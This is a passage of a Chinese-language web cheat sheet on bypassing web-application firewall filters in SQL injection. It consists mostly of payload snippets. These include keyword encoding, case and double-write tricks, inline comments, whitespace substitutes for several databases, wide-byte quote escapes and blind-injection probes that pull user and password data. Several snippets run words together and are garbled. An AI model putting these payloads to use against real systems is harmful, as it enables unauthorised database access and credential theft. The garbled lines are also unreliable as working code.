<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">%e0%</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">80</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">%a9</span></span></code></pre></div><h4 id="过滤union-select" tabindex="-1">过滤union\\select <a class="header-anchor" href="#过滤union-select" aria-label="Permalink to &quot;过滤union\\select&quot;">​</a></h4><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">逻辑绕过</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">例：</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">过滤代码 </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">union</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> select</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> user,</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">password</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> from</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> users</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">绕过方式 </span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> &amp;&amp; (</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> user </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> users </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">where</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> userid</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39;admin&#39;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">十六进制字符绕过</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> ——</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> selec\\x74</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">union</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">——</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">unio\\x6e</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">大小写绕过</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">SelEct</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">双写绕过</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">selselectect</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">uniunionon</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">urlencode，</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">ascii</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">char</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)，hex，unicode编码绕过</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">关键字内联绕所有</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#768390;">/*!union*/</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#768390;">/*!select*/</span></span></code></pre></div><h4 id="过滤空格" tabindex="-1">过滤空格 <a class="header-anchor" href="#过滤空格" aria-label="Permalink to &quot;过滤空格&quot;">​</a></h4><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">用Tab代替空格%</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">20</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> %</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">09</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> %0a %0b %0c %0d %a0 </span><span style="--shiki-light:#6A737D;--shiki-dark:#768390;">/**/</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">()</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">绕过空格注释符绕过</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">//</span><span style="--shiki-light:#6A737D;--shiki-dark:#768390;">--%20/**/#--+-- -;%00;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">空白字符绕过SQLite3  ——     0A,0D,0c,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">09</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">20</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">MYSQL</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">	09</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,0A,0B,0B,0D,A0,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">20</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">PosgressSQL</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">	0A,0D,0C,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">09</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">20</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">Oracle_11g</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">	00</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,0A,0D,0C,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">09</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">20</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">MSSQL</span></span>
<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">	01</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">02</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">03</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">04</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">05</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">06</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">07</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">08</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">09</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,0A,0B,0C,0D,0E,OF,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">10</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">11</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">12</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">13</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">14</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">15</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">16</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">17</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">18</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">19</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,1A,1B,1C,1D,1E,1F,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">20</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">特殊符号绕过</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">	\`  +  ！</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">等科学计数法绕过</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">	例：</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">	select user,password from users where user_id0e1union select 1,2</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">unicode编码</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">    %u0020 %uff00</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">    %c0%20 %c0%a0 %e0%80%a0</span></span></code></pre></div><h4 id="过滤" tabindex="-1">过滤= <a class="header-anchor" href="#过滤" aria-label="Permalink to &quot;过滤=&quot;">​</a></h4><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">?id</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39; or 1 like 1#可以绕过对 = &gt; 等过滤</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">or &#39;</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39; IN (&#39;</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1234</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39;)#可以替代=</span></span></code></pre></div><h4 id="过滤比较符" tabindex="-1">过滤比较符<code>&lt;&gt;</code> <a class="header-anchor" href="#过滤比较符" aria-label="Permalink to &quot;过滤比较符\`&lt;&gt;\`&quot;">​</a></h4><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select*</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">fromuserswhereid</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">1and </span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">ascii</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(substr(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">database</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(),</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">0</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">))</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">&gt;</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">64</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select*</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">fromuserswhereid</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">1and </span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">greatest</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">ascii</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(substr(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">database</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(),</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">0</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)),</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">64</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">64</span></span></code></pre></div><h4 id="过滤where" tabindex="-1">过滤where <a class="header-anchor" href="#过滤where" aria-label="Permalink to &quot;过滤where&quot;">​</a></h4><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">逻辑绕过</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">过滤代码 </span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> &amp;&amp; (</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> user </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> users </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">where</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> user_id </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> &#39;admin&#39;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">绕过方式 </span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> &amp;&amp; (</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> user </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> users </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">limit</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> &#39;admin&#39;</span></span></code></pre></div><h4 id="过滤limit" tabindex="-1">过滤limit <a class="header-anchor" href="#过滤limit" aria-label="Permalink to &quot;过滤limit&quot;">​</a></h4><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">逻辑绕过</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">过滤代码 </span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> &amp;&amp; (</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> user </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> users </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">limit</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> &#39;admin&#39;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">绕过方式 </span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> &amp;&amp; (</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> user </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> users </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">group by</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> user_id </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">having</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> user_id </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> &#39;admin&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">#user_id聚合中user_id为1的user为admin</span></span></code></pre></div><h4 id="过滤group-by" tabindex="-1">过滤group by <a class="header-anchor" href="#过滤group-by" aria-label="Permalink to &quot;过滤group by&quot;">​</a></h4><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">逻辑绕过</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">过滤代码 </span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> &amp;&amp; (</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> user </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> users </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">group by</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> user_id </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">having</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> user_id </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> &#39;admin&#39;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">绕过方式 </span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> &amp;&amp; (</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> substr(group_concat(user_id),</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">) user </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> users ) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span></span></code></pre></div><h4 id="过滤select" tabindex="-1">过滤select <a class="header-anchor" href="#过滤select" aria-label="Permalink to &quot;过滤select&quot;">​</a></h4><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">逻辑绕过</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">过滤代码 </span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> &amp;&amp; (</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> substr(group_concat(user_id),</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">) user </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> users ) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">绕过方式 </span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> &amp;&amp; substr(user,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> &#39;a&#39;</span></span></code></pre></div><h4 id="过滤-单引号" tabindex="-1">过滤’(单引号) <a class="header-anchor" href="#过滤-单引号" aria-label="Permalink to &quot;过滤’(单引号)&quot;">​</a></h4><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">逻辑绕过</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">waf </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> &#39;and|or|union|where|limit|group by|select|\\&#39;&#39;</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">过滤代码 1 &amp;&amp; substr(user,1,1) = &#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">a</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39;</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">绕过方式 1 &amp;&amp; user_id is not null1 &amp;&amp; substr(user,1,1) = 0x611 &amp;&amp; substr(user,1,1) = unhex(61)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">宽字节绕过</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">%bf%27 %df%27 %aa%27</span></span></code></pre></div><h4 id="过滤逗号" tabindex="-1">过滤逗号 <a class="header-anchor" href="#过滤逗号" aria-label="Permalink to &quot;过滤逗号&quot;">​</a></h4><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">在使用盲注的时候，需要使用到substr(),mid(),</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">limit</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">selectsubstr(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">database</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(0from1for1);selectmid(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">database</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(0from1for1);</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">对于limit可以使用offset来绕过：</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select*</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">fromnews limit0,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"># 等价于下面这条SQL语句select</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">*</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">fromnews limit1offset0</span></span></code></pre></div><h4 id="过滤hex" tabindex="-1">过滤hex <a class="header-anchor" href="#过滤hex" aria-label="Permalink to &quot;过滤hex&quot;">​</a></h4><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">逻辑绕过</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">过滤代码 </span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> &amp;&amp; substr(user,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">) </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> unhex(</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">61</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)</span></span>
